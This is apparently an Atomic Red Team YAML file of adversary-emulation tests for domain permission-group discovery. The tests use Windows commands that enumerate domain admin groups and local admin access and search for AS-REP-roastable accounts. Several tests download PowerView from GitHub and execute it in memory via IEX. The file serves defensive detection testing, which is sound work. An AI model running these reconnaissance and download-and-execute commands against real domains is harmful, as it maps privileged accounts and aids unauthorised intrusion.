attack_technique: T1069.002
display_name: 'Permission Groups Discovery: Domain Groups'
atomic_tests:
- name: Basic Permission Groups Discovery Windows (Domain)
  auto_generated_guid: dd66d77d-8998-48c0-8024-df263dc2ce5d
  description: |
    Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
    information will be displayed.
  supported_platforms:
  - windows
  executor:
    command: |
      net localgroup
      net group /domain
      net group "enterprise admins" /domain
      net group "domain admins" /domain
    name: command_prompt
- name: Permission Groups Discovery PowerShell (Domain)
  auto_generated_guid: 6d5d8c96-3d2a-4da9-9d6d-9a9d341899a7
  description: |
    Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
    information will be displayed.
  supported_platforms:
  - windows
  input_arguments:
    user:
      description: User to identify what groups a user is a member of
      type: string
      default: $env:USERNAME
  executor:
    command: |
      get-ADPrincipalGroupMembership #{user} | select name
    name: powershell
- name: Elevated group enumeration using net group (Domain)
  auto_generated_guid: 0afb5163-8181-432e-9405-4322710c0c37
  description: |
    Runs "net group" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This
    test will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.
  supported_platforms:
  - windows
  executor:
    command: |
      net groups "Account Operators" /doma
      net groups "Exchange Organization Management" /doma
      net group "BUILTIN\Backup Operators" /doma
      net group /domai "Domain Admins"
    name: command_prompt
- name: Find machines where user has local admin access (PowerView)
  auto_generated_guid: a2d71eee-a353-4232-9f86-54f4288dd8c1
  description: |
    Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.
  supported_platforms:
  - windows
  executor:
    command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
    name: powershell
- name: Find local admins on all machines in domain (PowerView)
  auto_generated_guid: a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd
  description: |
    Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.
  supported_platforms:
  - windows
  executor:
    command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
    name: powershell
- name: Find Local Admins via Group Policy (PowerView)
  auto_generated_guid: 64fdb43b-5259-467a-b000-1b02c00e510a
  description: |
    takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.
  supported_platforms:
  - windows
  input_arguments:
    computer_name:
      description: hostname of the computer to analyze
      type: path
      default: $env:COMPUTERNAME
  executor:
    command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose
    name: powershell
- name: Enumerate Users Not Requiring Pre Auth (ASRepRoast)
  auto_generated_guid: 870ba71e-6858-4f6d-895c-bb6237f6121b
  description: |
    When successful, accounts that do not require kerberos pre-auth will be returned
  supported_platforms:
  - windows
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Computer must be domain joined.
    prereq_command: |
      if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
    get_prereq_command: |
      Write-Host Joining this computer to a domain must be done manually.
  - description: |
      Requires the Active Directory module for powershell to be installed.
    prereq_command: |
      if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}
    get_prereq_command: |
      Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
  executor:
    name: powershell
    elevation_required: false
    command: |
      get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}

- name: Enumerate Active Directory Groups with Get-AdGroup
  auto_generated_guid: 3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8
  description: |
    The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.
    Upon successful execution a listing of groups will output with their paths in AD.
    Reference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps
  supported_platforms:
  - windows
  executor:
    name: powershell
    command: |
      Get-AdGroup -Filter *
- name: Enumerate Active Directory Groups with ADSISearcher
  auto_generated_guid: 9f4e344b-8434-41b3-85b1-d38f29d148d0
  description: |
    The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.
    Upon successful execution a listing of groups will output with their paths in AD.
    Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/
  supported_platforms:
  - windows
  executor:
    name: powershell
    elevation_required: false
    command: |
      ([adsisearcher]"objectcategory=group").FindAll(); ([adsisearcher]"objectcategory=group").FindOne()
- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)
  auto_generated_guid: 43fa81fb-34bb-4b5f-867b-03c7dbe0e3d8
  description: |
    When successful, accounts that do not require kerberos pre-auth will be returned.
    Reference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
  supported_platforms:
  - windows
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Computer must be domain joined.
    prereq_command: |
      if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
    get_prereq_command: |
      Write-Host Joining this computer to a domain must be done manually.
  - description: |
      Requires the Active Directory module for powershell to be installed.
    prereq_command: |
      if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}
    get_prereq_command: |
      Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
  executor:
    name: powershell
    elevation_required: false
    command: |
      Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
- name: Get-DomainGroupMember with PowerView
  auto_generated_guid: 46352f40-f283-4fe5-b56d-d9a71750e145
  description: |
    Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.
  supported_platforms:
  - windows
  executor:
    command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember "Domain Admins"
    name: powershell
- name: Get-DomainGroup with PowerView
  auto_generated_guid: 5a8a181c-2c8e-478d-a943-549305a01230
  description: |
    Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.
  supported_platforms:
  - windows
  executor:
    command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
    name: powershell
